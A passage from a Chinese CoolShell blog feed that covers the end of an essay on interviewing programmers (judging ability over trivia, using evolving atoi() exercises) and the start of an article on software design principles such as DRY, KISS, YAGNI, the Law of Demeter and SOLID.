<strong>知识</strong>。知识是一个人认知和学习的体现，可能会是一些基础概念和知识。比如这些问题：TCP和UDP的优缺点比 较，链表和哈希表的优缺点的比较。什么是堆什么是栈？进程间是怎么通信的？进程和线程的优缺点？同步和异步的优缺点？面向对象的XX设计模式的主要原则是 什么，等等。我以为，<strong>“知其然”只是操作技术，“知其所以然”才是真正的知识</strong>。知识不够并不代表他不能工作，会操作技能就可以应付工作，但是知识的欠缺一定会限制你的经验和能力，同样会影响你的开发质量。</li>
</ul>
<ul>
<li>
<strong>经验</strong>。经验通常跟一个人的经历有关系。一个人的知识范围，一个人经历过的事，通常会成为一个人经验的体现。面 试中，我们会问这些问题：你解决过最难的问题是什么？你是怎么设计这个系统的？你是怎么调试和测试你的程序的？你是怎么做性能调优的？什么样的代码是好的 代码？等等。对于工作年限不长的人来说，经历和做过的事的确会成为其经验的主要因素，尤其是业务上的有行业背景的东西。但是，我更以为，<strong>经验可能更多的是你对知识的运用和驾驭，是你对做过事情的反思和总结，是你对他人的学习，观察和交流</strong>。</li>
</ul>
<ul>
<li>
<strong>能力</strong>。一个人的能力并不会因为知道东西少而不行，也不会因为没有经验而没有能力。<strong>一个人的能力是他做事情的一种态度，性格，想法，思路，行为，方法和风格</strong>。<strong>只要有热情，有想法，有好的行为方法，以及好的行事风格，那么知识和经验对他来说只是一个时间问题</strong>。 比如：学习能力，专研精神，分析能力，沟通能力，组织能力，问题调查能力，合作能力等等。所以，对于一个新手来说，也许他的知识和经验有限，但并不代表他 能力上有问题，但是对于一个老手来说，如果其存在知识和经验欠缺的问题，那么通常都是其能力的问题。你可能暂时怀才不遇，但我不相信你会长期怀才不遇。如 果是的话，那么你必然些问题其让你的能力发挥不出来。而此时，“没有经历过”只会是你“没有能力”的一个借口。</li>
</ul>
<p>我不否认这四样东西对于一个优秀的程序员来说都很重要。但是，通过上述的分析，我们可以知道，能力和经验和知识需要分开对待。当然，这些东西是相辅相成的，你的能力可以让你获得知识，你的知识可以让你更有经验，你的经验又会改变你的想法和思路，从而改善你的能力。<strong>在面试中，我们需要清楚的认识到，应聘者的操作技能，知识和经验只是其能力的必要条件，并不是充要条件，而我们更应该关注于应聘者的能力</strong>。</p>
<ul>
<li>如果面试只是考查这个人的操作技能的话，那么这个面试完全失败。这是一个没有资格的面试官。</li>
<li>如果面试只是在考查这个人的知识和经验的话，那么成功了一半。因为你了解了基础知和做过的事，但这并不代表你完全了解他的真正能力。</li>
<li>如果你能够在了解这个人的知识和经验的过程中重点关注其能力（态度、性格、想法，思路，行为，方法和风格），并能正确地评估这个人的能力，那么你的面试算是非常成功的。</li>
</ul>
<p>也许用这四个词来描述定套东西并不太合适，但我相信你明白我想表达的。另外，我想说的是，<strong>我们不是出个题来考倒应聘者，而是要找到应聘者的亮点和长处</strong>。</p>
<h4>不要肤浅地认识算法题和智力题</h4>
<p>很多公司都会在面试的时候给一些算法题或是一些智力题或是一些设计题，我相信算法题或是智力题是程序员们在面试过程中最反感的事了。很多人都很BS面试官问的算法题，因为他们认为面试官问的这些算法题或智力题在实际工作当中用不到。但我想在这里说，<strong>问难的算法智力题并没有错，错的很多面试官只是在肤浅甚至错误地理解着面试中的难题的目的</strong>。他们认为，能做出算法题和智力题的人就是聪明的人就是有能力的人，这种想法实在是相当的肤浅。</p>
<p>其实，能解难题并不意味着这个人就有能力就能在工作中解决问题，你可以想想，小学奥数题可能比这些题更难，但并不意味着那些奥数能手就有实际工作能力。你可 以想一想你们班考试得高分的同学并不一定就是聪明的人，也不一定就是有能力的人，相反，这样的人往往者是在应试教育下培养出来的书呆子。</p>
<p>所以，我认为解难题的过程更重要，你要主要是通过解题查看这个应聘者的思路，方法，运用到的知识，有没有一些经验，和你一起交互时和沟通得是否顺畅，等等，这些才是你重点要去观察的。当然，最终是要找到答案的。</p>
<p>我想，让面试者解决一个难题的真正思路是：</p>
<ul>
<li>
<strong>看看他对知识的应用和理解</strong>。比如，他是否会用一些基础的数据结构和算法来解决算法题？</li>
<li>
<strong>看看他的整个解题思路和想法</strong>。答案是次要的，他的想法和行为才是重要的。</li>
<li>
<strong>看看他是如何和你讨论交流的</strong>。把面试者当成你未来的同事，当成你的工作伙伴，一起解题，一起讨论，这样可以看看大家是否可以在一起工作。</li>
</ul>
<p>这些方面才是考查应聘者的能力（思路，方法、态度，性格等），并顺带着考查面试者的经验和知识。下面是一些面试的点：</p>
<ul>
<li>应聘者在解算法题时会不会分解或简化这个难题。这是分析能力。</li>
<li>应聘者在解算法题 时会不会使用一些基础知识，如数据结构和基础算法。这是知识。</li>
<li>应聘者在解题 时和你讨论的过程中你有没有感到应聘者的专研精神和良好的沟通。</li>
<li>应聘者在对待这个算法题的心态和态度。如，面试面是否有畏难情绪。</li>
<li>应聘者在解题时的思路和方法是否得当，是否是比较科学的方法？</li>
<li>等等。</li>
</ul>
<p><strong>在解难题 的过程中考查应聘者的能力才是最终目的，而不是为难应聘者，不然，你只是一个傲慢而无知的面试官</strong>。</p>
<h4>模拟实际中的挑战和能力</h4>
<p>作为面试官的你，你应该多想想你的工作，以及你的成长经历。这会对你的面试很有帮助。你在工作中解决问题的实际情况是什么？你写代码的实际情况是什么？你的成长经历是什么？你是怎么获得知识和能力的？你喜欢和什么样的人工作？<strong>相信你不难会发现你工作中的实际情况和面试的情况完全是两码事，那么，你怎么可以用这种与实际情况差别那么大的面试来评估一个人的能力呢</strong>？</p>
<p>所以，最为理想的面试是一起工作一段时间。当然，这个在招聘过程中，操作起来几乎不可能，因此，这就要求我们的面试官尽可能地把面试的过程模拟成平时工作的 过程。大家一些讨论来解决一个难题，和应聘者一起回顾一下他已经做过的事情，并在回础的过程中相互讨论相互学习。下面举一个例子。</p>
<p>我们知道，对于软件开发来说，开发软件不难，难是的下面是这些挑战：</p>
<ol>
<li>软件的维护成本远远大于软件的开发成本。</li>
<li>软件的质量变得越来越重要，所以，测试工作也变得越来越重要。</li>
<li>软件的需求总是在变的，软件的需求总是一点一点往上加的。</li>
<li>程序中大量的代码都是在处理一些错误的或是不正常的流程。</li>
</ol>
<p>所 以，当我们在考查应聘者的代码能力时候，我们为什么不能模拟这样的过程呢？比如，让应聘者实现一个atoi()的函数，实现起来应该很简单，然后 不断地往上加新的需求或新的案例，比如：处理符号，处理非数字的字母的情况，处理有空格的情况，处理十六进制，处理二进制，处理“逗号”，等等，我们要看 应聘者是怎么修改他的代码的，怎么写测试案例的，怎么重构的，随着要处理的东西越来越多，他的代码是否还是那么易读和清晰。如果只是考查编码能力，一个小时，就问这一个问题，足矣。真正的程序员每天都在和这样的事打交道的。</p>
<p>如果要考查应聘者的设计能力，同样可以如法泡制。不断地加新的功 能，新的需求。看看面试者的思路，想法，分 析的方法，和你的讨论是否流畅，说没说在 点上，思想清不清晰，会应用什么样的知识，他在设计这个系统时的经验是会是什么样的，面对不断的修改和越来越复杂的需求，他的设计是否还是那么好？</p>
<p>当然，因为时间比较短，所以，你不能出太复杂的问题，这需要你精心设计一些精制的有代表性的问题。</p>
<p>（末完，<a title="再谈“我是怎么招聘程序员的”（下）" href="https://coolshell.cn/articles/4490.html" target="_blank">请参看下篇</a>）</p>
<p style="text-align: right;"><a title="再谈“我是怎么招聘程序员的”（下）" href="https://coolshell.cn/articles/4490.html" target="_blank"><strong>再谈“我是怎么招聘程序员的”（下）&gt;&gt;&gt;</strong></a></p>
<p><span style="color: #ff0000;"><strong>（请勿用于商业用途，转载时请注明作者和出处）</strong></span></p>
<p align="center"><img alt="image placeholder" > <img alt="image placeholder" > <br>关注CoolShell微信公众账号和微信小程序</p>
<div style="margin-top: 15px; font-size: 11px;color: #cc0000;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
<div style="text-align:center;padding:0px;font-size: 14px;margin-bottom: 50px;">——=== <b>访问 <a href="https://coolshell.cn/404/" target="_blank">酷壳404页面</a> 寻找遗失儿童。</b> ===——</div>
<div class="wp_rp_wrap  wp_rp_vertical_m" id="wp_rp_first"><div class="wp_rp_content">
<h3 class="related_post_title">相关文章</h3>
<ul class="related_post wp_rp">
<li>
<a href="https://coolshell.cn/articles/12052.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/12052.html" class="wp_rp_title">Leetcode 编程训练</a>
</li>
<li>
<a href="https://coolshell.cn/articles/8138.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/8138.html" class="wp_rp_title">为什么我反对纯算法面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4976.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4976.html" class="wp_rp_title">给程序员新手的一些建议</a>
</li>
<li>
<a href="https://coolshell.cn/articles/4490.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/4490.html" class="wp_rp_title">再谈“我是怎么招聘程序员的”（下）</a>
</li>
<li>
<a href="https://coolshell.cn/articles/3345.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/3345.html" class="wp_rp_title">140个Google的面试题</a>
</li>
<li>
<a href="https://coolshell.cn/articles/1870.html" class="wp_rp_thumbnail"><img alt="image placeholder" ></a><a href="https://coolshell.cn/articles/1870.html" class="wp_rp_title">我是怎么招聘程序员的</a>
</li>
</ul>
</div></div>
<div id="post-ratings-4506" class="post-ratings" itemscope itemtype="http://schema.org/Article" data-nonce="c9cf494901">
<img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" ><img alt="image placeholder" > (<strong>40</strong> 人打了分，平均分： <strong>4.55</strong> )<br><span class="post-ratings-text" id="ratings_4506_text"></span><meta itemprop="name" content="再谈“我是怎么招聘程序员的”（上）">
<meta itemprop="headline" content="再谈“我是怎么招聘程序员的”（上）">
<meta itemprop="description" content="我以前写过一篇“我是怎么招聘程序员的”的文章（在CSDN那里有很多人进行了回复）。今天，我想再谈谈关于招聘和面试这方面的东西，主要是以下这些原因：

	近半年来我在进行了大量的招聘工作，对面试有一些新的体会。
	酷壳最近发布了几篇趣味面试题（面试题一，面试题二，面试题三），从回复中让我有一些思考。
	我有一个同事最近面试了一家公司，他和我分享了一个博士专家对他的面试，也让我思考了一些。
...">
<meta itemprop="datePublished" content="2011-04-20T08:36:55+08:00">
<meta itemprop="dateModified" content="2013-05-05T21:10:25+08:00">
<meta itemprop="url" content="https://coolshell.cn/articles/4506.html">
<meta itemprop="author" content="陈皓">
<meta itemprop="mainEntityOfPage" content="https://coolshell.cn/articles/4506.html">
<div style="display: none;" itemprop="publisher" itemscope itemtype="https://schema.org/Organization">
<meta itemprop="name" content="酷 壳 - CoolShell">
<meta itemprop="url" content="https://coolshell.cn">
<div itemprop="logo" itemscope itemtype="https://schema.org/ImageObject"><meta itemprop="url" content=""></div>
</div>
<div style="display: none;" itemprop="aggregateRating" itemscope itemtype="http://schema.org/AggregateRating">
<meta itemprop="bestRating" content="5">
<meta itemprop="worstRating" content="1">
<meta itemprop="ratingValue" content="4.55">
<meta itemprop="ratingCount" content="40">
</div>
</div>
<div id="post-ratings-4506-loading" class="post-ratings-loading">
<img alt="image placeholder" >Loading...</div>
 ]]></content>
<pubDate>2011-04-20T08:36:55+08:00</pubDate>
<guid>https://coolshell.cn/articles/4506.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ 一些软件设计的原则 ]]></title>
<link>https://coolshell.cn/articles/4535.html</link>
<content><![CDATA[ 
<p>以前本站向大家介绍过一些软件开发的原则，比如<a title="优质代码的十诫" rel="bookmark" href="https://coolshell.cn/articles/1007.html" target="_blank">优质代码的十诫</a>和<a title="Unix传奇(下篇)" href="https://coolshell.cn/articles/2324.html" target="_blank">Unix传奇(下篇)</a>中所以说的UNIX的设计原则。相信大家从中能够从中学了解到一些设计原理方面的知识，正如我在《<a title="再谈“我是怎么招聘程序员的”（上）" href="https://coolshell.cn/articles/4506.html" target="_blank">再谈“我是怎么招聘程序”</a>》中所说的，一个好的程序员通常由其操作技能、知识水平，经验层力和能力四个方面组成。在这里想和大家说说设计中的一些原则，我认为这些东西属于长期经验总结出来的知识。这些原则，每一个程序员都应该了解。但是请不要教条主义，在使用的时候还是要多多考虑实际情况。其实，<strong>下面这些原则，不单单只是软件开发，可以推广到其它生产活动中，甚至我们的生活中</strong>。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#Dont_Repeat_Yourself_DRY" title="Don’t Repeat Yourself (DRY)">Don’t Repeat Yourself (DRY)</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#Keep_It_Simple_Stupid_KISS" title="Keep It Simple, Stupid (KISS)">Keep It Simple, Stupid (KISS)</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#Program_to_an_interface_not_an_implementation" title="Program to an interface, not an implementation">Program to an interface, not an implementation</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#Command-Query_Separation_CQS_-_%E5%91%BD%E4%BB%A4-%E6%9F%A5%E8%AF%A2%E5%88%86%E7%A6%BB%E5%8E%9F%E5%88%99" title="Command-Query Separation (CQS)  – 命令-查询分离原则">Command-Query Separation (CQS)  – 命令-查询分离原则</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#You_Aint_Gonna_Need_It_YAGNI" title="You Ain’t Gonna Need It (YAGNI)">You Ain’t Gonna Need It (YAGNI)</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#Law_of_Demeter_-_%E8%BF%AA%E7%B1%B3%E7%89%B9%E6%B3%95%E5%88%99" title="Law of Demeter – 迪米特法则">Law of Demeter – 迪米特法则</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-7" href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84SOLID_%E5%8E%9F%E5%88%99" title="面向对象的S.O.L.I.D 原则">面向对象的S.O.L.I.D 原则</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-8" href="#Common_Closure_Principle%EF%BC%88CCP%EF%BC%89-_%E5%85%B1%E5%90%8C%E5%B0%81%E9%97%AD%E5%8E%9F%E5%88%99" title="Common Closure Principle（CCP）– 共同封闭原则">Common Closure Principle（CCP）– 共同封闭原则</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#Common_Reuse_Principle_CRP_-_%E5%85%B1%E5%90%8C%E9%87%8D%E7%94%A8%E5%8E%9F%E5%88%99" title="Common Reuse Principle (CRP) – 共同重用原则">Common Reuse Principle (CRP) – 共同重用原则</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-10" href="#Hollywood_Principle_-_%E5%A5%BD%E8%8E%B1%E5%9D%9E%E5%8E%9F%E5%88%99" title="Hollywood Principle – 好莱坞原则">Hollywood Principle – 好莱坞原则</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-11" href="#High_Cohesion_LowLoose_coupling_-_%E9%AB%98%E5%86%85%E8%81%9A%EF%BC%8C_%E4%BD%8E%E8%80%A6%E5%90%88" title="High Cohesion &amp; Low/Loose coupling &amp; – 高内聚， 低耦合">High Cohesion &amp; Low/Loose coupling &amp; – 高内聚， 低耦合</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-12" href="#Convention_over_Configuration%EF%BC%88CoC%EF%BC%89-_%E6%83%AF%E4%BE%8B%E4%BC%98%E4%BA%8E%E9%85%8D%E7%BD%AE%E5%8E%9F%E5%88%99" title="Convention over Configuration（CoC）– 惯例优于配置原则">Convention over Configuration（CoC）– 惯例优于配置原则</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-13" href="#Separation_of_Concerns_SoC_-_%E5%85%B3%E6%B3%A8%E7%82%B9%E5%88%86%E7%A6%BB" title="Separation of Concerns (SoC) – 关注点分离">Separation of Concerns (SoC) – 关注点分离</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-14" href="#Design_by_Contract_DbC_-_%E5%A5%91%E7%BA%A6%E5%BC%8F%E8%AE%BE%E8%AE%A1" title="Design by Contract (DbC) – 契约式设计">Design by Contract (DbC) – 契约式设计</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-15" href="#Acyclic_Dependencies_Principle_ADP_-_%E6%97%A0%E7%8E%AF%E4%BE%9D%E8%B5%96%E5%8E%9F%E5%88%99" title="Acyclic Dependencies Principle (ADP) – 无环依赖原则">Acyclic Dependencies Principle (ADP) – 无环依赖原则</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-16" href="#coolshell" title="————————————————————————————">————————————————————————————</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="Dont_Repeat_Yourself_DRY"></span>Don’t Repeat Yourself (DRY)<span class="ez-toc-section-end"></span>
</h4>
<p>DRY 是一个最简单的法则，也是最容易被理解的。但它也可能是最难被应用的（因为要做到这样，我们需要在泛型设计上做相当的努力，这并不是一件容易的事）。它意味着，当我们在两个或多个地方的时候发现一些相似的代码的时候，我们需要把他们的共性抽象出来形一个唯一的新方法，并且改变现有的地方的代码让他们以一些合适的参数调用这个新的方法。</p>
<p><strong>参考</strong>：<a title="http://en.wikipedia.org/wiki/Don%27t_repeat_yourself" rel="nofollow" href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself">http://en.wikipedia.org/wiki/Don%27t_repeat_yourself</a></p>
<h4>
<span class="ez-toc-section" id="Keep_It_Simple_Stupid_KISS"></span>Keep It Simple, Stupid (KISS)<span class="ez-toc-section-end"></span>
</h4>
<p>KISS原则在设计上可能最被推崇的，在家装设计，界面设计 ，操作设计上，复杂的东西越来越被众人所BS了，而简单的东西越来越被人所认可，比如<a title="UI的恶梦" href="https://coolshell.cn/articles/1907.html" target="_blank">这些UI的设计</a>和我们<a title="为什么中国的网页设计那么烂？" href="https://coolshell.cn/articles/3605.html" target="_blank">中国网页</a>（尤其是<a title="微软用新浪来当反面教材" href="https://coolshell.cn/articles/3872.html" target="_blank">新浪的网页</a>）者是负面的例子。“宜家”（IKEA）简约、效率的家居设计、生产思路；“微软”（Microsoft）“所见即所得”的理念；“谷歌”（Google)简约、直接的商业风格，无一例外的遵循了“kiss”原则，也正是“kiss”原则，成就了这些看似神奇的商业经典。而苹果公司的iPhone/iPad将这个原则实践到了极至。</p>
<p><span id="more-4535"></span></p>
<p>把一个事情搞复杂是一件简单的事，但要把一个复杂的事变简单，这是一件复杂的事。</p>
<p><strong>参考</strong>：<a title="http://en.wikipedia.org/wiki/KISS_principle" rel="nofollow" href="https://en.wikipedia.org/wiki/KISS_principle">http://en.wikipedia.org/wiki/KISS_principle</a></p>
<h4>
<span class="ez-toc-section" id="Program_to_an_interface_not_an_implementation"></span>Program to an interface, not an implementation<span class="ez-toc-section-end"></span>
</h4>
<p>这是设计模式中最根本的哲学，注重接口，而不是实现，依赖接口，而不是实现。接口是抽象是稳定的，实现则是多种多样的。以后面我们会面向对象的SOLID原则中会提到我们的依赖倒置原则，就是这个原则的的另一种样子。还有一条原则叫 <strong>Composition over inheritance</strong>（喜欢组合而不是继承），这两条是那23个经典设计模式中的设计原则。</p>
<h4>
<span class="ez-toc-section" id="Command-Query_Separation_CQS_-_%E5%91%BD%E4%BB%A4-%E6%9F%A5%E8%AF%A2%E5%88%86%E7%A6%BB%E5%8E%9F%E5%88%99"></span>Command-Query Separation (CQS)  – 命令-查询分离原则<span class="ez-toc-section-end"></span>
</h4>
<ul>
<li>查询：当一个方法返回一个值来回应一个问题的时候，它就具有查询的性质；</li>
<li>命令：当一个方法要改变对象的状态的时候，它就具有命令的性质；</li>
</ul>
<p>通常，一个方法可能是纯的Command模式或者是纯的Query模式，或者是两者的混合体。在设计接口时，如果可能，应该尽量使接口单一化，保证方法的行为严格的是命令或者是查询，这样查询方法不会改变对象的状态，没有副作用，而会改变对象的状态的方法不可能有返回值。也就是说：如果我们要问一个问题，那么就不应该影响到它的答案。实际应用，要视具体情况而定，语义的清晰性和使用的简单性之间需要权衡。将Command和Query功能合并入一个方法，方便了客户的使用，但是，降低了清晰性，而且，可能不便于基于断言的程序设计并且需要一个变量来保存查询结果。</p>
<p>在系统设计中，很多系统也是以这样原则设计的，查询的功能和命令功能的系统分离，这样有则于系统性能，也有利于系统的安全性。</p>
<p><strong>参考</strong>：<a title="http://en.wikipedia.org/wiki/Command-query_separation" rel="nofollow" href="https://en.wikipedia.org/wiki/Command-query_separation">http://en.wikipedia.org/wiki/Command-query_separation</a></p>
<h4>
<span class="ez-toc-section" id="You_Aint_Gonna_Need_It_YAGNI"></span>You Ain’t Gonna Need It (YAGNI)<span class="ez-toc-section-end"></span>
</h4>
<p>这个原则简而言之为——只考虑和设计必须的功能，避免过度设计。只实现目前需要的功能，在以后您需要更多功能时，可以再进行添加。</p>
<ul>
<li>如无必要，勿增复杂性。</li>
<li>软件开发先是一场沟通博弈。</li>
</ul>
<p>以前本站有一篇关于<a title="代码重构的一个示例" href="https://coolshell.cn/articles/3005.html" target="_blank">过度重构的文章</a>，这个示例就是这个原则的反例。而，WebSphere的设计者就<a href="https://www.bbc.co.uk/news/business-11944966" target="_blank">表示过他过度设计了这个产品</a>。我们的程序员或是架构师在设计系统的时候，会考虑很多扩展性的东西，导致在架构与设计方面使用了大量折衷，最后导致项目失败。这是个令人感到讽刺的教训，因为本来希望尽可能延长项目的生命周期，结果反而缩短了生命周期。</p>
<p><strong>参考</strong>：<a title="http://en.wikipedia.org/wiki/You_Ain%27t_Gonna_Need_It" rel="nofollow" href="https://en.wikipedia.org/wiki/You_Ain%27t_Gonna_Need_It" target="_blank">http://en.wikipedia.org/wiki/You_Ain%27t_Gonna_Need_It</a></p>
<h4>
<span class="ez-toc-section" id="Law_of_Demeter_-_%E8%BF%AA%E7%B1%B3%E7%89%B9%E6%B3%95%E5%88%99"></span>Law of Demeter – 迪米特法则<span class="ez-toc-section-end"></span>
</h4>
<p>迪米特法则(Law of Demeter)，又称“最少知识原则”（Principle of Least Knowledge），其来源于1987年荷兰大学的一个叫做Demeter的项目。Craig Larman把Law of Demeter又称作“不要和陌生人说话”。在《程序员修炼之道》中讲LoD的那一章叫作“解耦合与迪米特法则”。关于迪米特法则有一些很形象的比喻：</p>
<ul>
<li>如果你想让你的狗跑的话，你会对狗狗说还是对四条狗腿说？</li>
<li>如果你去店里买东西，你会把钱交给店员，还是会把钱包交给店员让他自己拿？</li>
</ul>
<p>和狗的四肢说话？让店员自己从钱包里拿钱？这听起来有点荒唐，不过在我们的代码里这几乎是见怪不怪的事情了。</p>
<p>对于LoD，正式的表述如下：</p>
<blockquote>
<p>对于对象 ‘O’ 中一个方法’M’，M应该只能够访问以下对象中的方法：</p>
<ol>
<li>对象O；</li>
<li>与O直接相关的Component Object；</li>
<li>由方法M创建或者实例化的对象；</li>
<li>作为方法M的参数的对象。</li>
</ol>
</blockquote>
<p>在《Clean Code》一书中，有一段Apache framework中的一段违反了LoD的代码：</p>
<p style="padding-left: 30px;">final String outputDir = ctxt.getOptions().getScratchDir().getAbsolutePath();</p>
<p>这么长的一串对其它对象的细节，以及细节的细节，细节的细节的细节……的调用，增加了耦合，使得代码结构复杂、僵化，难以扩展和维护。</p>
<p>在《重构》一书中的代码的环味道中有一种叫做“Feature Envy”(依恋情结），形象的描述了一种违反了LoC的情况。Feature Envy就是说一个对象对其它对象的内容更有兴趣，也就是说老是羡慕别的对象的成员、结构或者功能，大老远的调用人家的东西。这样的结构显然是不合理的。我们的程序应该写得比较“害羞”。不能像前面例子中的那个不把自己当外人的店员一样，拿过客人的钱包自己把钱拿出来。“害羞”的程序只和自己最近的朋友交谈。这种情况下应该调整程序的结构，让那个对象自己拥有它羡慕的feature，或者使用合理的设计模式（例如Facade和Mediator）。</p>
<p><strong>参考</strong>：<a title="http://en.wikipedia.org/wiki/Principle_of_Least_Knowledge" rel="nofollow" href="https://en.wikipedia.org/wiki/Principle_of_Least_Knowledge">http://en.wikipedia.org/wiki/Principle_of_Least_Knowledge</a></p>
<h4>
<span class="ez-toc-section" id="%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84SOLID_%E5%8E%9F%E5%88%99"></span>面向对象的S.O.L.I.D 原则<span class="ez-toc-section-end"></span>
</h4>
<p>一般来说这是面向对象的五大设计原则，但是，我觉得这些原则可适用于所有的软件开发。</p>
<p><strong>Single Responsibility Principle (SRP) – 职责单一原则</strong></p>
<p>关于单一职责原则，其核心的思想是：<strong>一个类，只做一件事，并把这件事做好，其只有一个引起它变化的原因</strong>。单一职责原则可以看作是低耦合、高内聚在面向对象原则上的引申，将职责定义为引起变化的原因，以提高内聚性来减少引起变化的原因。职责过多，可能引起它变化的原因就越多，这将导致职责依赖，相互之间就产生影响，从而极大的损伤其内聚性和耦合度。单一职责，通常意味着单一的功能，因此不要为一个模块实现过多的功能点，以保证实体只有一个引起它变化的原因。</p>
<ul>
<li>Unix/Linux是这一原则的完美体现者。各个程序都独立负责一个单一的事。</li>
<li>Windows是这一原则的反面示例。几乎所有的程序都交织耦合在一起。</li>
</ul>
<p><strong>Open/Closed Principle (OCP) – 开闭原则</strong></p>
<p>关于开发封闭原则，其核心的思想是：模块是可扩展的，而不可修改的。也就是说，<strong>对扩展是开放的，而对修改是封闭的</strong>。</p>
<ul>
<li>对扩展开放，意味着有新的需求或变化时，可以对现有代码进行扩展，以适应新的情况。</li>
<li>对修改封闭，意味着类一旦设计完成，就可以独立完成其工作，而不要对类进行任何修改。</li>
</ul>
<p>对于面向对象来说，需要你依赖抽象，而不是实现，23个经典设计模式中的“策略模式”就是这个实现。对于非面向对象编程，一些API需要你传入一个你可以扩展的函数，比如我们的C 语言的qsort()允许你提供一个“比较器”，STL中的容器类的内存分配，ACE中的多线程的各种锁。对于软件方面，浏览器的各种插件属于这个原则的实践。</p>
<p><strong>Liskov substitution principle (LSP) – 里氏代换原则</strong></p>
<p>软件工程大师Robert C. Martin把里氏代换原则最终简化为一句话：“Subtypes must be substitutable for their base types”。也就是，子类必须能够替换成它们的基类。即：子类应该可以替换任何基类能够出现的地方，并且经过替换以后，代码还能正常工作。另外，不应该在代码中出现if/else之类对子类类型进行判断的条件。里氏替换原则LSP是使代码符合开闭原则的一个重要保证。正是由于子类型的可替换性才使得父类型的模块在无需修改的情况下就可以扩展。</p>
<p>这么说来，似乎有点教条化，我非常建议大家看看这个原则个两个最经典的案例——“正方形不是长方形”和“鸵鸟不是鸟”。通过这两个案例，你会明白《墨子 小取》中说的 ——“娣，美人也，爱娣，非爱美人也….盗，人也；恶盗，非恶人也。”——妹妹虽然是美人，但喜欢妹妹并不代表喜欢美人。盗贼是人，但讨厌盗贼也并不代表就讨厌人类。<strong>这个原则让你考虑的不是语义上对象的间的关系，而是实际需求的环境</strong>。</p>
<p>在很多情况下，在设计初期我们类之间的关系不是很明确，LSP则给了我们一个判断和设计类之间关系的基准：需不需要继承，以及怎样设计继承关系。</p>
<p><strong>Interface Segregation Principle (ISP) – 接口隔离原则</strong></p>
<p>接口隔离原则意思是把功能实现在接口中，而不是类中，使用多个专门的接口比使用单一的总接口要好。</p>
<p>举个例子，我们对电脑有不同的使用方式，比如：写作，通讯，看电影，打游戏，上网，编程，计算，数据等，如果我们把这些功能都声明在电脑的抽类里面，那么，我们的上网本，PC机，服务器，笔记本的实现类都要实现所有的这些接口，这就显得太复杂了。所以，我们可以把其这些功能接口隔离开来，比如：工作学习接口，编程开发接口，上网娱乐接口，计算和数据服务接口，这样，我们的不同功能的电脑就可以有所选择地继承这些接口。</p>
<p>这个原则可以提升我们“搭积木式”的软件开发。对于设计来说，Java中的各种Event Listener和Adapter，对于软件开发来说，不同的用户权限有不同的功能，不同的版本有不同的功能，都是这个原则的应用。</p>
<p><strong>Dependency Inversion Principle (DIP) – 依赖倒置原则</strong></p>
<p>高层模块不应该依赖于低层模块的实现，而是依赖于高层抽象。</p>
<p>举个例子，墙面的开关不应该依赖于电灯的开关实现，而是应该依赖于一个抽象的开关的标准接口，这样，当我们扩展程序的时候，我们的开关同样可以控制其它不同的灯，甚至不同的电器。也就是说，电灯和其它电器继承并实现我们的标准开关接口，而我们的开关产商就可不需要关于其要控制什么样的设备，只需要关心那个标准的开关标准。这就是依赖倒置原则。</p>
<p>这就好像浏览器并不依赖于后面的web服务器，其只依赖于HTTP协议。这个原则实在是太重要了，社会的分工化，标准化都是这个设计原则的体现。</p>
<p><strong>参考</strong>：<a href="https://en.wikipedia.org/wiki/Solid_(object-oriented_design)">http://en.wikipedia.org/wiki/Solid_(object-oriented_design)</a></p>
<h4>
